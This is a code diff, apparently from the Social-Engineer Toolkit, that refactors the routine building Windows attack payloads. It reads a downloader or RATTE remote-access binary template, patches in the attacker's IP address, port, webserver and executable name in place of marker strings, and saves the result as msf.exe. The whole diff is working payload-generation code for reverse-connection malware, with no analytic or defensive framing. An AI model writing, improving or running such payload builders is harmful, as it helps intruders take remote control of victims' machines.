@@ -92,6 +92,15 @@ reverse_connection = webserver
 
 webserver = exe_name + " " + webserver
 
+
+def _binary_marker(value, marker):
+    return ((len(str(value)) + 1) * marker).encode("ascii")
+
+
+def _nul_terminated(value):
+    return (str(value) + "\x00").encode("utf-8")
+
+
 # this is generated through payloadgen.py and lets SET know if its a RATTE
 # payload or SET payload
 if os.path.isfile(userconfigpath + "set.payload"):
@@ -112,39 +121,22 @@ if os.path.isfile(userconfigpath + "set.payload.posix"):
 # if we selected the SET Interactive shell in payloadgen
 if payload_selection == "SETSHELL":
     # replace ipaddress with one that we need for reverse connection back
-    fileopen = open("src/payloads/set_payloads/downloader.windows", "rb")
-    data = fileopen.read()
-    filewrite = open(userconfigpath + "msf.exe", "wb")
-    host = int(len(exe_name) + 1) * "X"
-    webserver_count = int(len(webserver) + 1) * "S"
-    ipaddr_count = int(len(ipaddr) + 1) * "M"
-    filewrite.write(data.replace(str(host), exe_name + "\x00", 1))
-    filewrite.close()
-    fileopen = open(userconfigpath + "msf.exe", "rb")
-    data = fileopen.read()
-    filewrite = open(userconfigpath + "msf.exe", "wb")
-    filewrite.write(data.replace(str(webserver_count), webserver + "\x00", 1))
-    filewrite.close()
-    fileopen = open(userconfigpath + "msf.exe", "rb")
-    data = fileopen.read()
-    filewrite = open(userconfigpath + "msf.exe", "wb")
-    filewrite.write(data.replace(str(ipaddr_count), ipaddr + "\x00", 1))
-    filewrite.close()
+    with open("src/payloads/set_payloads/downloader.windows", "rb") as fileopen:
+        data = fileopen.read()
+    data = data.replace(_binary_marker(exe_name, "X"), _nul_terminated(exe_name), 1)
+    data = data.replace(_binary_marker(webserver, "S"), _nul_terminated(webserver), 1)
+    data = data.replace(_binary_marker(ipaddr, "M"), _nul_terminated(ipaddr), 1)
+    with open(userconfigpath + "msf.exe", "wb") as filewrite:
+        filewrite.write(data)
 
 # if we selected RATTE in our payload selection
 if payload_selection == "RATTE":
-    fileopen = open("src/payloads/ratte/ratte.binary", "rb")
-    data = fileopen.read()
-    filewrite = open(userconfigpath + "msf.exe", "wb")
-    host = int(len(ipaddr) + 1) * "X"
-    rPort = int(len(str(port)) + 1) * "Y"
-    filewrite.write(data.replace(str(host), ipaddr + "\x00", 1))
-    filewrite.close()
-    fileopen = open(userconfigpath + "msf.exe", "rb")
-    data = fileopen.read()
-    filewrite = open(userconfigpath + "msf.exe", "wb")
-    filewrite.write(data.replace(str(rPort), str(port) + "\x00", 1))
-    filewrite.close()
+    with open("src/payloads/ratte/ratte.binary", "rb") as fileopen:
+        data = fileopen.read()
+    data = data.replace(_binary_marker(ipaddr, "X"), _nul_terminated(ipaddr), 1)
+    data = data.replace(_binary_marker(port, "Y"), _nul_terminated(port), 1)
+    with open(userconfigpath + "msf.exe", "wb") as filewrite:
+        filewrite.write(data)
 
 print_status("Done, moving the payload into the action.")
 
